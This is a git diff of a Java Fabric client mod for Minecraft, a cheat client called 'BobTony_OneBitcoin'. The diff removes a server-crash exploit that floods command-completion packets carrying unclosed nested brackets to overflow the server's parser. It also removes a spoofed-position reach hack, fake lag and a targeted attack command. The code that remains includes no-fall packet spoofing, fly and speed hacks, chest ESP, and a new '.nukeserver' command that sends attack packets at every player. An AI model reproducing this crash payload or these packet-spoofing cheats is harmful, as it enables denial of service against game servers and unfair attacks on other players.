@@ -1,53 +1,46 @@
 package dev.onyxx.bobtony.client;
 
 import com.mojang.blaze3d.systems.RenderSystem;
-import com.mojang.brigadier.arguments.IntegerArgumentType;
-import com.mojang.brigadier.arguments.StringArgumentType;
-import com.mojang.brigadier.suggestion.SuggestionProvider;
-import dev.einfachyannik.bobtony.utils.gui.Color;
+import dev.einfachyannik.bobtony.utils.Color;
 import dev.einfachyannik.bobtony.utils.render.Render3D;
 import dev.einfachyannik.bobtony.enums.Modes;
-import dev.einfachyannik.bobtony.utils.render.WorldToScreen;
 import net.fabricmc.fabric.api.client.event.lifecycle.v1.ClientTickEvents;
 import net.fabricmc.fabric.api.client.keybinding.v1.KeyBindingHelper;
 import net.fabricmc.fabric.api.client.message.v1.ClientSendMessageEvents;
-import net.fabricmc.fabric.api.client.networking.v1.ClientPlayNetworking;
-import net.fabricmc.fabric.api.client.rendering.v1.HudRenderCallback;
 import net.fabricmc.fabric.api.client.rendering.v1.WorldRenderEvents;
-import net.fabricmc.fabric.api.networking.v1.ServerPlayConnectionEvents;
-import net.fabricmc.fabric.api.networking.v1.ServerPlayNetworking;
 import net.minecraft.block.*;
 import net.minecraft.block.entity.*;
 import net.minecraft.client.MinecraftClient;
-import net.minecraft.client.gui.DrawContext;
 import net.minecraft.client.option.KeyBinding;
 import net.minecraft.client.render.*;
 import net.minecraft.client.util.InputUtil;
 import net.minecraft.client.network.ClientPlayerEntity;
 import net.minecraft.client.util.math.MatrixStack;
 import net.minecraft.entity.Entity;
-import net.minecraft.network.packet.PacketType;
+import net.minecraft.entity.player.PlayerEntity;
 import net.minecraft.network.packet.c2s.play.PlayerInteractEntityC2SPacket;
 import net.minecraft.network.packet.c2s.play.PlayerMoveC2SPacket;
-import net.minecraft.network.packet.c2s.play.RequestCommandCompletionsC2SPacket;
 import net.minecraft.server.MinecraftServer;
-import net.minecraft.server.network.ServerPlayNetworkHandler;
 import net.minecraft.text.Text;
-import net.minecraft.util.Hand;
-import net.minecraft.util.Identifier;
-import net.minecraft.util.hit.EntityHitResult;
-import net.minecraft.util.math.*;
+import net.minecraft.util.math.BlockPos;
+import net.minecraft.util.math.Box;
+import net.minecraft.util.math.ChunkPos;
+import net.minecraft.util.math.Vec3d;
+import net.minecraft.util.shape.VoxelShape;
 import net.minecraft.world.World;
+import net.minecraft.world.chunk.Chunk;
 import net.minecraft.world.chunk.WorldChunk;
 import org.lwjgl.glfw.GLFW;
-import org.slf4j.Logger;
-import org.slf4j.LoggerFactory;
 
-import java.util.*;
+import java.awt.*;
+import java.util.ArrayList;
+import java.util.HashMap;
 import java.util.List;
-import java.util.stream.Collectors;
-import java.util.stream.IntStream;
+import java.util.Objects;
 import java.util.stream.Stream;
+
+import static dev.einfachyannik.bobtony.utils.render.Render3D.drawLineToEntity;
+import static dev.einfachyannik.bobtony.utils.render.Render3D.getEntityPositionOffsetInterpolated;
 
 public class BobTony_OneBitcoin {
     // Keybindings
@@ -63,17 +56,14 @@ public class BobTony_OneBitcoin {
     private boolean wasJumping = false; // Tracks if the jump key was previously pressed
     private long lastModeSwitchTime = 0; // Last mode switch timestamp
     private static final long MODE_SWITCH_COOLDOWN = 1000; // Cooldown time for mode switching in ms
-    public static float flyspeed = 0.1f; // Default flight speed
-    public static float strength = 2.0f;
-    public static float speed = 1.0f;
+    private float flyspeed = 0.1f; // Default flight speed
+    private float strength = 2.0f;
+    private float speed = 1.0f;
     public static boolean nofall = false;
-    public static Modes mode = Modes.NONE; //Mode
-    public static boolean chestesp = false;
-    public static boolean fly = false;
-    private static final Logger LOGGER = LoggerFactory.getLogger("PacketLoggerClient");
-    public static boolean fakeLag = false;
-    public static int fakeLagDelay = 350;
-    public static boolean reachHack = false;
+    private Modes mode = Modes.NONE; //Mode
+    private List<Block> trackerBlockList = new ArrayList();
+    private static boolean chestesp = false;
+    private static boolean fly = false;
 
     public BobTony_OneBitcoin() {
         toggleModeKey = KeyBindingHelper.registerKeyBinding(new KeyBinding(
@@ -102,16 +92,11 @@ public class BobTony_OneBitcoin {
                         client.player.getY(),
                         client.player.getZ(),
                         true,
-                        true
+                        false
                 ));
 
                 // Wenn ich immernoch damage in der Luft nehme dann geh ich crashout
                 client.player.fallDistance = 0.0f;
-            }
-
-            // Reach
-            if (client.options.attackKey.isPressed() && reachHack) {
-                attackWithReach(player, 100.0);
             }
 
         });
@@ -126,8 +111,8 @@ public class BobTony_OneBitcoin {
             } else if (message.startsWith(".flyspeed ")) {
                 handelFlySpeedCommand(message);
                 return false;
-            } else if (message.startsWith(".attack ")) {
-                attackCommand(message);
+            } else if (message.equals(".nukeserver")) {
+                handleNukeCommand();
                 return false;
             } else if (message.startsWith(".speed ")) {
                 handleSpeedCommand(message);
@@ -141,18 +126,6 @@ public class BobTony_OneBitcoin {
             } else if (message.equals(".fly")){
                 handleFly();
                 return false;
-            } else if (message.startsWith(".crash ")){
-                handleCrash(message);
-                return false;
-            } else if (message.equals(".fakelag")){
-                fakeLag = !fakeLag;
-                return false;
-            } else if (message.startsWith(".delay ")){
-                handeFakeLag(message);
-                return false;
-            } else if (message.equals(".reach")){
-                reachHack = !reachHack;
-                return false;
             }
 
             return true; //Maybe ein forceMessage also das mutes nichts mehr bringen
@@ -161,14 +134,12 @@ public class BobTony_OneBitcoin {
         WorldRenderEvents.AFTER_ENTITIES.register(context -> {
             MinecraftClient client = MinecraftClient.getInstance();
             MatrixStack matrices = context.matrixStack();
-            Camera camera = client.gameRenderer.getCamera();
+            VertexConsumerProvider vertexConsumer = context.consumers();
             Vec3d cameraPos = client.gameRenderer.getCamera().getPos();
             World world = client.world;
-            VertexConsumerProvider.Immediate vertexConsumerProvider = (VertexConsumerProvider.Immediate) context.consumers();
 
             float tickDelta = context.tickCounter().getTickDelta(false);
             Color color = new Color(255, 0, 0, 1.0F);
-
 
             for (Entity entity : client.world.getEntities()) {
                 if (trackerList != null) {
@@ -185,8 +156,6 @@ public class BobTony_OneBitcoin {
                                         interpolatedY - entity.getY() - cameraPos.y,
                                         interpolatedZ - entity.getZ() - cameraPos.z
                                 );
-
-                                DrawContext drawContext = new DrawContext(client, vertexConsumerProvider);
 
                                 //Render3D.drawBox(matrices, vertexConsumer.getBuffer(RenderLayer.LINES), box.minX, box.minY, box.minZ, box.maxX, box.maxY, box.maxZ, red, green, blue, alpha, red, green, blue);
                                 Render3D.draw3DHitBox(matrices, box, color, 2.0F);
@@ -257,85 +226,6 @@ public class BobTony_OneBitcoin {
 
         });
 
-        HudRenderCallback.EVENT.register(((drawContext, tickCounter) -> {
-            MinecraftClient client = MinecraftClient.getInstance();
-            for (Entity entity : client.world.getEntities()) {
-                if (trackerList != null) {
-                    for (String name : trackerList) {
-                        if (Objects.equals(entity.getName(), Text.literal(name))) {
-                            java.awt.Color color = new java.awt.Color(255, 255, 255);
-                            float delta = tickCounter.getTickDelta(false);
-
-                            int screenW = client.getWindow().getScaledWidth(), screenH = client.getWindow().getScaledHeight();
-
-                            float yaw = client.player.getYaw();
-                            float pitch = client.player.getPitch();
-
-                            String distance = String.valueOf(entity.distanceTo(client.player));
-
-                            Vec3d namePos = new Vec3d(entity.getX(), entity.getY() + 2.5, entity.getZ());
-                            Vec3d distancePos = new Vec3d(entity.getX(), entity.getY() + 2.2, entity.getZ());
-
-                            Vec3d screenPos = WorldToScreen.worldSpaceToScreenSpace(namePos);
-                            Vec3d screenPosDistance = WorldToScreen.worldSpaceToScreenSpace(distancePos);
-
-                            if (screenPos != null) {
-
-                                if (WorldToScreen.screenSpaceCoordinateIsVisible(screenPos)) {
-                                    drawContext.drawText(client.textRenderer, name, (int) screenPos.x, (int) screenPos.y, color.getRGB(), false);
-                                    drawContext.drawText(client.textRenderer, distance, (int) screenPosDistance.x, (int) screenPosDistance.y, color.getRGB(), false);
-                                }
-                            }
-                        }
-                    }
-                }
-            }
-        }));
-    }
-
-    private void handeFakeLag(String message){
-
-        MinecraftClient client = MinecraftClient.getInstance();
-        String[] parts = message.split(" ");
-        if (parts.length == 2) {
-            try {
-                fakeLagDelay = Integer.parseInt(parts[1]);
-                client.player.sendMessage(Text.literal(PREFIX + "Delay: §c" + fakeLagDelay), false);
-            } catch (NumberFormatException e) {
-                client.player.sendMessage(Text.literal(PREFIX + "§cKeine richtige Zahl!"), false);
-            }
-        } else {
-            client.player.sendMessage(Text.literal(PREFIX + "§cUsage: .delay <value>"), false);
-        }
-    }
-
-    private void handleCrash(String message){
-
-        String[] parts = message.split(" ");
-
-        int packets = Integer.parseInt(parts[1]);
-
-        // Made it smaller under 2048, but it still cannot throw stackoverflow every time.
-        String overflow = generateJsonObject(2032);
-
-        // Latest server builds can kick if partialCommand length is greater than 2048,
-        // probably can be compressed even more.
-        String partialCommand = message.replace("{PAYLOAD}", overflow);
-        for (int i = 0; i < packets; i++) {
-            MinecraftClient.getInstance().getNetworkHandler().sendPacket(new RequestCommandCompletionsC2SPacket(0, partialCommand));
-        }
-
-    }
-
-    private String generateJsonObject(int levels) {
-        // Brigadier does not check for closing brackets
-        // Until it is too late.
-
-        // Replaced Object with array and removed closing brackets
-        String in = IntStream.range(0, levels)
-                .mapToObj(i -> "[")
-                .collect(Collectors.joining());
-        return "{a:" + in + "}";
     }
 
     private void handleFly(){
@@ -464,28 +354,17 @@ public class BobTony_OneBitcoin {
         }
     }
 
-    private void attackCommand(String message){
+    private void handleNukeCommand(){
 
         MinecraftClient client = MinecraftClient.getInstance();
         MinecraftServer server = client.getServer();
 
-        String[] parts = message.split(" ");
-
-        if (parts.length == 2){
-            if (server != null) {
-                server.getOverworld().getPlayers().forEach(player -> {
-                    if (player.getName().equals(parts[1])){
-                        for (int i = 0; i < 20; i++){
-                            PlayerInteractEntityC2SPacket attackPacket = PlayerInteractEntityC2SPacket.attack(player, client.player.isSneaking());
-                            client.player.networkHandler.sendPacket(attackPacket);
-                            client.player.swingHand(Hand.MAIN_HAND);
-                        }
-                    }
-                });
-            }
+        if (server != null) {
+            server.getOverworld().getPlayers().forEach(player -> {
+                PlayerInteractEntityC2SPacket packet = PlayerInteractEntityC2SPacket.attack(player, client.player.isSneaking());
+                client.getNetworkHandler().sendPacket(packet);
+            });
         }
-
-
 
     }
 
@@ -523,7 +402,7 @@ public class BobTony_OneBitcoin {
             if (currentTime - lastJumpTime < 300) { // Double jump detected
                 if(mode == Modes.FLY) {
                     toggleFlyMode(player);
-                }else if(mode == Modes.BOOST) {
+                }else {
                     boostPlayer(player);
                 }
             }
@@ -601,73 +480,6 @@ public class BobTony_OneBitcoin {
             }
         }).start();
     }
-
-    public static EntityHitResult getReachTarget(ClientPlayerEntity player, double range) {
-        Vec3d startPos = player.getCameraPosVec(1.0f);
-        Vec3d lookVec = player.getRotationVec(1.0f);
-        Vec3d endPos = startPos.add(lookVec.multiply(range));
-
-        Box box = player.getBoundingBox().expand(range);
-        List<Entity> entities = player.getWorld().getOtherEntities(player, box);
-
-        EntityHitResult closestEntity = null;
-        double closestDistance = range;
-
-        for (Entity entity : entities) {
-            Box entityBox = entity.getBoundingBox().expand(0.1);
-            Vec3d hitResult = entityBox.raycast(startPos, endPos).orElse(null);
-
-            if (hitResult != null) {
-                double distance = startPos.distanceTo(hitResult);
-                if (distance < closestDistance) {
-                    closestEntity = new EntityHitResult(entity);
-                    closestDistance = distance;
-                }
-            }
-        }
-
-        return closestEntity;
-    }
-
-    public static void attackWithReach(ClientPlayerEntity player, double range) {
-        EntityHitResult target = getReachTarget(player, range);
-
-        if (target != null) {
-            Entity entity = target.getEntity();
-
-            double oldX = player.getX();
-            double oldY = player.getY();
-            double oldZ = player.getZ();
-
-            Vec3d oldPos = new Vec3d(player.getX(), player.getY(), player.getZ());
-
-            PlayerMoveC2SPacket resetPacket = new PlayerMoveC2SPacket.PositionAndOnGround(
-                    oldPos.getX(),
-                    oldPos.getY(),
-                    oldPos.getZ(),
-                    player.groundCollision,
-                    player.horizontalCollision
-            );
-
-            PlayerMoveC2SPacket movePacket = new PlayerMoveC2SPacket.PositionAndOnGround(
-                    target.getEntity().getX(),
-                    target.getEntity().getY(),
-                    target.getEntity().getZ(),
-                    player.groundCollision,
-                    player.horizontalCollision
-            );
-
-            PlayerInteractEntityC2SPacket attackPacket = PlayerInteractEntityC2SPacket.attack(entity, player.isSneaking());
-            player.networkHandler.sendPacket(movePacket);
-            System.out.println(new Vec3d(target.getEntity().getX(), target.getEntity().getY(), target.getEntity().getZ()));
-            player.networkHandler.sendPacket(attackPacket);
-            player.networkHandler.sendPacket(resetPacket);
-            System.out.println(new Vec3d(oldPos.getX(), oldPos.getY(), oldPos.getZ()));
-
-            player.swingHand(player.getActiveHand());
-        }
-    }
-
 }
 
 
